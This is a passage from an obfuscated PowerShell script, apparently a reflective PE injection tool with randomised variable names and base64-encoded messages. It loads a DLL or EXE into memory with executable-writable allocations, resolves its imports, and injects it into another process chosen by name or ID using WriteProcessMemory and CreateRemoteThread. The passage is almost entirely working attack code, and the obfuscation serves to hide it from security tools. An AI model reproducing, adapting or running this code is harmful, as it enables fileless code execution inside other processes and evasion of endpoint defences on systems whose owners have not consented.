				${dd4b2676e8224a01aaf12b89b05f1b62} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE)
			}
			${e7e7ac3edc0d4ffb98eb836b45e69437} = ${dd4b2676e8224a01aaf12b89b05f1b62}
		}
		[IntPtr]${63fbd3ce556a4675a4faeac6be3e4b08} = Add-SignedIntAsUnsigned (${dd4b2676e8224a01aaf12b89b05f1b62}) ([Int64]${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage)
		if (${dd4b2676e8224a01aaf12b89b05f1b62} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy(${dd84f627e34042a19d0e69bbfb56125d}, 0, ${dd4b2676e8224a01aaf12b89b05f1b62}, ${a6f1c45867c645738edd3413cf0d7718}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${a6f1c45867c645738edd3413cf0d7718} = Get-PEDetailedInfo -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${63fbd3ce556a4675a4faeac6be3e4b08}
		${a6f1c45867c645738edd3413cf0d7718} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${e7e7ac3edc0d4ffb98eb836b45e69437}
		Write-Verbose "StartAddress: $(Get-Hex ${dd4b2676e8224a01aaf12b89b05f1b62})    EndAddress: $(Get-Hex ${63fbd3ce556a4675a4faeac6be3e4b08})"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		Copy-Sections -dd84f627e34042a19d0e69bbfb56125d ${dd84f627e34042a19d0e69bbfb56125d} -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		Update-MemoryAddresses -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -bbcbfc25b29142cebda6a3ecf7dde05f ${bbcbfc25b29142cebda6a3ecf7dde05f} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
		{
			Import-DllImports -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23} -dbc8e071ba554a5991d5c23be7628337 ${dbc8e071ba554a5991d5c23be7628337}
		}
		else
		{
			Import-DllImports -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
		}
		if (${f229a27ea82c4771b75975fc5836337f} -eq $false)
		{
			if (${829c848dbac54130b8bf1d0113439da7} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				Update-MemoryProtectionFlags -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239}
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${f229a27ea82c4771b75975fc5836337f} -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${e7e7ac3edc0d4ffb98eb836b45e69437}, ${dd4b2676e8224a01aaf12b89b05f1b62}, [UIntPtr](${a6f1c45867c645738edd3413cf0d7718}.SizeOfImage), [Ref]$NumBytesWritten)
			if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${a6f1c45867c645738edd3413cf0d7718}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${f229a27ea82c4771b75975fc5836337f} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${8a012061633b426eb5cc19fc0ff71e9f} = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${961a3c8f10b343c4a00371e4425ba2d2} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${6cf2d81bf0fa41529b831885cdc2bd0d} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8a012061633b426eb5cc19fc0ff71e9f}, ${961a3c8f10b343c4a00371e4425ba2d2})
				${6cf2d81bf0fa41529b831885cdc2bd0d}.Invoke(${a6f1c45867c645738edd3413cf0d7718}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${8a012061633b426eb5cc19fc0ff71e9f} = Add-SignedIntAsUnsigned (${e7e7ac3edc0d4ffb98eb836b45e69437}) (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${a6f1c45867c645738edd3413cf0d7718}.PE64Bit -eq $true)
				{
					${a8d5b5f7db8d4c11bb2696c21836296e} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${0b3cc96560774003bd5005c9f7330f32} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${0825717c99574e67b457be19093ea738} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${a8d5b5f7db8d4c11bb2696c21836296e} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${0b3cc96560774003bd5005c9f7330f32} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${0825717c99574e67b457be19093ea738} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${a1220aac391e475094e2d6fd51dd409b} = ${a8d5b5f7db8d4c11bb2696c21836296e}.Length + ${0b3cc96560774003bd5005c9f7330f32}.Length + ${0825717c99574e67b457be19093ea738}.Length + (${316b88f6ef8c400aac88c3cceb745ea2} * 2)
				${24b08de68b624efeb0e3966151e88e69} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${a1220aac391e475094e2d6fd51dd409b})
				${6770c7074f724af3b307beac3b0efcdc} = ${24b08de68b624efeb0e3966151e88e69}
				Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${a8d5b5f7db8d4c11bb2696c21836296e} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
				${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${a8d5b5f7db8d4c11bb2696c21836296e}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${e7e7ac3edc0d4ffb98eb836b45e69437}, ${24b08de68b624efeb0e3966151e88e69}, $false)
				${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
				Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${0b3cc96560774003bd5005c9f7330f32} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
				${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${0b3cc96560774003bd5005c9f7330f32}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${8a012061633b426eb5cc19fc0ff71e9f}, ${24b08de68b624efeb0e3966151e88e69}, $false)
				${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${316b88f6ef8c400aac88c3cceb745ea2})
				Write-BytesToMemory -bf800d3fa83245d1b619eccd7ab95bf1 ${0825717c99574e67b457be19093ea738} -ed8e2beac355444db175543089c05e66 ${24b08de68b624efeb0e3966151e88e69}
				${24b08de68b624efeb0e3966151e88e69} = Add-SignedIntAsUnsigned ${24b08de68b624efeb0e3966151e88e69} (${0825717c99574e67b457be19093ea738}.Length)
				${57fdb583807a436db51c28f76ab30f0d} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualAllocEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, [IntPtr]::Zero, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, ${a851be47767a4e43b58c4498cda85d23}.MEM_COMMIT -bor ${a851be47767a4e43b58c4498cda85d23}.MEM_RESERVE, ${a851be47767a4e43b58c4498cda85d23}.PAGE_EXECUTE_READWRITE)
				if (${57fdb583807a436db51c28f76ab30f0d} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.WriteProcessMemory.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, ${6770c7074f724af3b307beac3b0efcdc}, [UIntPtr][UInt64]${a1220aac391e475094e2d6fd51dd409b}, [Ref]$NumBytesWritten)
				if ((${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]${a1220aac391e475094e2d6fd51dd409b}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${03df08d8080045db90eb42fba5fdfdab} = Create-RemoteThread -ae1e830f808141fc83d07d13d133dd73 ${dbc8e071ba554a5991d5c23be7628337} -cf3b0c7ec8154434be540fb42c7d8bc2 ${57fdb583807a436db51c28f76ab30f0d} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5}
				${ad4a1ce275f0418bb89955c7769f006a} = ${e68f649120fc4868841a2d8eea9e08f5}.WaitForSingleObject.Invoke(${03df08d8080045db90eb42fba5fdfdab}, 20000)
				if (${ad4a1ce275f0418bb89955c7769f006a} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				${e68f649120fc4868841a2d8eea9e08f5}.VirtualFreeEx.Invoke(${dbc8e071ba554a5991d5c23be7628337}, ${57fdb583807a436db51c28f76ab30f0d}, [UIntPtr][UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${a6f1c45867c645738edd3413cf0d7718}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${a58ef014534245c991e74b19306d6cb3} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${a58ef014534245c991e74b19306d6cb3}, 0, 0x00)
			${8ef755cdee8b43689ba191b08e0f5e08} = Update-ExeFunctions -a6f1c45867c645738edd3413cf0d7718 ${a6f1c45867c645738edd3413cf0d7718} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23} -e9d488658e5045cdb725ead7e42bcfa8 ${eae5ed9674894f6898fbef0835eef491} -a58ef014534245c991e74b19306d6cb3 ${a58ef014534245c991e74b19306d6cb3}
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
			${e68f649120fc4868841a2d8eea9e08f5}.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte(${a58ef014534245c991e74b19306d6cb3}, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -cc2e4d7defdc427bb7379a767e207a0e ${8ef755cdee8b43689ba191b08e0f5e08} -e68f649120fc4868841a2d8eea9e08f5 ${e68f649120fc4868841a2d8eea9e08f5} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${a6f1c45867c645738edd3413cf0d7718}.PEHandle, ${e7e7ac3edc0d4ffb98eb836b45e69437})
	}
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${dd4b2676e8224a01aaf12b89b05f1b62}
		)
		${a851be47767a4e43b58c4498cda85d23} = Get-Win32Constants
		${e68f649120fc4868841a2d8eea9e08f5} = Get-Win32Functions
		${e39002e42e324234be4b9268daddc239} = Get-Win32Types
		${a6f1c45867c645738edd3413cf0d7718} = Get-PEDetailedInfo -dd4b2676e8224a01aaf12b89b05f1b62 ${dd4b2676e8224a01aaf12b89b05f1b62} -e39002e42e324234be4b9268daddc239 ${e39002e42e324234be4b9268daddc239} -a851be47767a4e43b58c4498cda85d23 ${a851be47767a4e43b58c4498cda85d23}
		if (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${8eae317484b149a1b2b2b28c8691917c} = Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${ca5a2326b79d43a3b81e5bab8a1c9536} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${8eae317484b149a1b2b2b28c8691917c}, [Type]${e39002e42e324234be4b9268daddc239}.IMAGE_IMPORT_DESCRIPTOR)
				if (${ca5a2326b79d43a3b81e5bab8a1c9536}.Characteristics -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.FirstThunk -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.ForwarderChain -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.Name -eq 0 `
						-and ${ca5a2326b79d43a3b81e5bab8a1c9536}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${7e24bc57bb2942989bb237b7e87a010f} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]${a6f1c45867c645738edd3413cf0d7718}.PEHandle) ([Int64]${ca5a2326b79d43a3b81e5bab8a1c9536}.Name)))
				${2c3440b301eb4e4d8f9459b6020a0435} = ${e68f649120fc4868841a2d8eea9e08f5}.GetModuleHandle.Invoke(${7e24bc57bb2942989bb237b7e87a010f})
				if (${2c3440b301eb4e4d8f9459b6020a0435} -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: ${7e24bc57bb2942989bb237b7e87a010f}. Continuing anyways" -WarningAction Continue
				}
				${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.FreeLibrary.Invoke(${2c3440b301eb4e4d8f9459b6020a0435})
				if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
				{
					Write-Warning "Unable to free library: ${7e24bc57bb2942989bb237b7e87a010f}. Continuing anyways." -WarningAction Continue
				}
				${8eae317484b149a1b2b2b28c8691917c} = Add-SignedIntAsUnsigned (${8eae317484b149a1b2b2b28c8691917c}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${e39002e42e324234be4b9268daddc239}.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${8a012061633b426eb5cc19fc0ff71e9f} = Add-SignedIntAsUnsigned (${a6f1c45867c645738edd3413cf0d7718}.PEHandle) (${a6f1c45867c645738edd3413cf0d7718}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${961a3c8f10b343c4a00371e4425ba2d2} = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${6cf2d81bf0fa41529b831885cdc2bd0d} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8a012061633b426eb5cc19fc0ff71e9f}, ${961a3c8f10b343c4a00371e4425ba2d2})
		${6cf2d81bf0fa41529b831885cdc2bd0d}.Invoke(${a6f1c45867c645738edd3413cf0d7718}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${bfd6b4588cf14a19b91ca177e24a9fe3} = ${e68f649120fc4868841a2d8eea9e08f5}.VirtualFree.Invoke(${dd4b2676e8224a01aaf12b89b05f1b62}, [UInt64]0, ${a851be47767a4e43b58c4498cda85d23}.MEM_RELEASE)
		if (${bfd6b4588cf14a19b91ca177e24a9fe3} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function Main
	{
		${e68f649120fc4868841a2d8eea9e08f5} = Get-Win32Functions
		${e39002e42e324234be4b9268daddc239} = Get-Win32Types
		${a851be47767a4e43b58c4498cda85d23} =  Get-Win32Constants
		${dbc8e071ba554a5991d5c23be7628337} = [IntPtr]::Zero
		if ((${d5db2eebed4843d5965cd466ea96af95} -ne $null) -and (${d5db2eebed4843d5965cd466ea96af95} -ne 0) -and (${ef8ec5899e654fb7ba1f4be16a82ddab} -ne $null) -and (${ef8ec5899e654fb7ba1f4be16a82ddab} -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif (${ef8ec5899e654fb7ba1f4be16a82ddab} -ne $null -and ${ef8ec5899e654fb7ba1f4be16a82ddab} -ne "")
		{
			${8e316ad56b494c74977f77d03941c755} = @(ps -Name ${ef8ec5899e654fb7ba1f4be16a82ddab} -ErrorAction SilentlyContinue)
			if (${8e316ad56b494c74977f77d03941c755}.Count -eq 0)
			{
				Throw "Can't find process ${ef8ec5899e654fb7ba1f4be16a82ddab}"
			}
			elseif (${8e316ad56b494c74977f77d03941c755}.Count -gt 1)
			{
				${af27e05dcf7943da8d246d909ba8fba0} = ps | where { $_.Name -eq ${ef8ec5899e654fb7ba1f4be16a82ddab} } | select ProcessName, Id, SessionId
				echo ${af27e05dcf7943da8d246d909ba8fba0}
				Throw "More than one instance of ${ef8ec5899e654fb7ba1f4be16a82ddab} found, please specify the process ID to inject in to."
			}
			else
			{
				${d5db2eebed4843d5965cd466ea96af95} = ${8e316ad56b494c74977f77d03941c755}[0].ID
			}
		}
		if ((${d5db2eebed4843d5965cd466ea96af95} -ne $null) -and (${d5db2eebed4843d5965cd466ea96af95} -ne 0))
		{
			${dbc8e071ba554a5991d5c23be7628337} = ${e68f649120fc4868841a2d8eea9e08f5}.OpenProcess.Invoke(0x001F0FFF, $false, ${d5db2eebed4843d5965cd466ea96af95})
			if (${dbc8e071ba554a5991d5c23be7628337} -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: ${d5db2eebed4843d5965cd466ea96af95}"
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
		${dd4b2676e8224a01aaf12b89b05f1b62} = [IntPtr]::Zero
		if (${dbc8e071ba554a5991d5c23be7628337} -eq [IntPtr]::Zero)
		{
			${9fb5019741ec46faa2f58cf44c343cb6} = Invoke-MemoryLoadLibrary -dd84f627e34042a19d0e69bbfb56125d ${dd84f627e34042a19d0e69bbfb56125d} -eae5ed9674894f6898fbef0835eef491 ${eae5ed9674894f6898fbef0835eef491} -af14924eb7024c53a36e0e49783042b6 ${af14924eb7024c53a36e0e49783042b6}
		}
		else
		{
			${9fb5019741ec46faa2f58cf44c343cb6} = Invoke-MemoryLoadLibrary -dd84f627e34042a19d0e69bbfb56125d ${dd84f627e34042a19d0e69bbfb56125d} -eae5ed9674894f6898fbef0835eef491 ${eae5ed9674894f6898fbef0835eef491} -dbc8e071ba554a5991d5c23be7628337 ${dbc8e071ba554a5991d5c23be7628337} -af14924eb7024c53a36e0e49783042b6 ${af14924eb7024c53a36e0e49783042b6}
		}
		if (${9fb5019741ec46faa2f58cf44c343cb6} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${dd4b2676e8224a01aaf12b89b05f1b62} = ${9fb5019741ec46faa2f58cf44c343cb6}[0]
		${e3694672f13548bb9fc9b8bc03340ff7} = ${9fb5019741ec46faa2f58cf44c343cb6}[1] 
